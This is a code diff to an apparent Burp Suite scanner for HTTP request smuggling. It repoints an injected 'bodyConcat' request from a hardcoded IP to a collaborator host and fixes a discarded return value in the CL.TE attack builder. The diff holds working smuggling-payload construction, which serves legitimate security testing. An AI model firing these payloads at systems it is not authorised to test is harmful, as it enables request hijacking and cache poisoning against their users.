@@ -180,8 +180,8 @@ public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
                             "Foo: x";
                     break;
                 case "bodyConcat":
-                    inject = "POST /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
-                            "Host: 52.16.21.24\r\n" +
+                    inject = "POST /x?"+service.getHost()+" HTTP/1.1\r\n" +
+                            "Host: "+collabWithHost+"\r\n" +
                             "Content-Type: application/x-www-form-urlencoded\r\n" +
                             "Content-Length: 8\r\n\r\n" +
                             "foo=";
@@ -243,10 +243,9 @@ public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
 
     static Pair<String, Integer> getCLTEAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
         byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive", true);
-        makeChunked(prep, inject.length(), 0, config, false); // no need to bypass content-length fix
+        prep = makeChunked(prep, inject.length(), 0, config, false); // no need to bypass content-length fix
         //prep = bypassContentLengthFix(makeChunked(prep, inject.length(), 0, config, false));
         return new ImmutablePair<>(Utilities.helpers.bytesToString(prep)+inject, inject.length() * -1);
-
     }
 
     static Pair<String, Integer> getTECLAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
